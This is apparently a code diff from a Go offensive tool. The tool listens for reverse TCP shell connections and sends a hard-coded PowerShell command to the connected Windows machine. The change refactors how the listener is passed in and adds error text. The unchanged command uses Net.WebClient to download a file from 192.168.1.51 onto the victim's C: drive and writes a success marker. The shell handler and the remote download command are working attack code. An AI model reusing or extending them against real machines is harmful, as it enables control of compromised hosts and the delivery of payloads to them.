@@ -7,11 +7,10 @@ import (
   "time"
 )
 
-func ListenForConnection() net.Conn {
-  listener, _ := net.Listen("tcp4", ":5454")
+func ListenForConnection(listener net.Listener) net.Conn {
   conn, err := listener.Accept()
   if err != nil {
-    fmt.Println("we gotta connection accept error boss")
+    fmt.Println("we gotta connection accept error boss, " + err.Error())
   }
   fmt.Println("TCP connection accepted")
   return conn
@@ -22,11 +21,11 @@ func CloseConnectionLoudly(conn net.Conn) {
   fmt.Println("Connection closed")
 }
 
-func ListenAndHandleTCPShell(){
+func ListenAndHandleTCPShell(listener net.Listener){
   command := "C:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe -C \"(new-object Net.WebClient).DownloadFile('http://192.168.1.51/index.html', 'C:\\downloado.txt')\" && echo succ > C:\\succ.txt"
   fmt.Println("Listening for reverse TCP shell...")
 
-  conn := ListenForConnection()
+  conn := ListenForConnection(listener)
   reader := bufio.NewReader(conn)
   writer := bufio.NewWriter(conn)
 
